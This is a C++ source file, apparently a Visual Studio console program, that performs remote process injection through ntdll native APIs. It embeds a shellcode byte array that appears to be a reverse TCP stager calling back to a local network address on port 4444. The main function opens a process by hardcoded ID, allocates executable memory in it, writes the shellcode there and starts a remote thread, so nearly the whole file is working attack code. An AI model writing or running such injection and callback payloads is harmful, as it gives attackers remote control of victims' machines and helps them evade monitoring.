// NtProcessInjection.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include "types.h"
int main()
{
    unsigned char buf[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f"
        "\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b"
        "\x42\x3c\x41\x51\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
        "\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
        "\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x8b\x48\x18\x49\x01"
        "\xd0\x50\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88"
        "\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
        "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
        "\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
        "\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
        "\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
        "\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
        "\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
        "\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x92\x80\x41\x54"
        "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
        "\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
        "\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
        "\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
        "\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
        "\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
        "\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
        "\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
        "\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
        "\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
        "\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
        "\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
        "\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
        "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
        "\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
        "\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
        "\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
        "\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
        "\xf0\xb5\xa2\x56\xff\xd5";


    HMODULE ntdll = LoadLibraryA("ntdll.dll");

    if (ntdll == INVALID_HANDLE_VALUE)
    {
        std::cout << "Error Opening NTDLL.DLL" << std::endl;
    }

    NtOpenProcess pNtOpenProcess =(NtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");

    if (pNtOpenProcess == NULL)
    {
        std::cout << "Error getting address of NtOpenProcess" << std::endl;
    }

    HANDLE notepad;
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    CLIENT_ID clid;
    DWORD pid = 7720;
    clid.UniqueProcess = (void*)pid;
    clid.UniqueThread = 0;

    if (pNtOpenProcess(&notepad, PROCESS_ALL_ACCESS, &objAttr, &clid))
    {
        std::cout << "Error Opening Notepad handle." << std::endl;

        std::cout << GetLastError() << std::endl;
    }

       
    NtAllocateVirtualMemory pNtAllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");

    if (pNtAllocateVirtualMemory == NULL)
    {
        std::cout << "Error getting address of NtAllocateVirtualMemory" << std::endl;
    }
    
    PVOID remoteAddr = 0;
    SIZE_T sz = 510;
    if (pNtAllocateVirtualMemory(notepad, &remoteAddr, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))
    {
        std::cout << "Error allocating a region in the remote process" << std::endl;
        std::cout << GetLastError() << std::endl;
    }

    NtWriteVirtualMemory pNtWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");

    if (pNtWriteVirtualMemory == NULL)
    {
        std::cout << "Error getting address of NtWriteVirtualMemory" << std::endl;
    }

    if (pNtWriteVirtualMemory(notepad, remoteAddr, buf, sizeof(buf), NULL))
    {
        std::cout << "Error writing to the region in the remote process" << std::endl;
        std::cout << GetLastError() << std::endl;
    }
    
    NtCreateThreadEx pNtCreateThreadEx = (NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    if (pNtCreateThreadEx == NULL)
    {
        std::cout << "Error getting address of NtCreateThreadEx" << std::endl;
    }

    HANDLE hThread;

    if (pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, notepad, remoteAddr, NULL, NULL, 0, 0, 0, NULL))
    {
        std::cout << "Error creating a thread in the remote process" << std::endl;
        std::cout << GetLastError() << std::endl;
    }
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
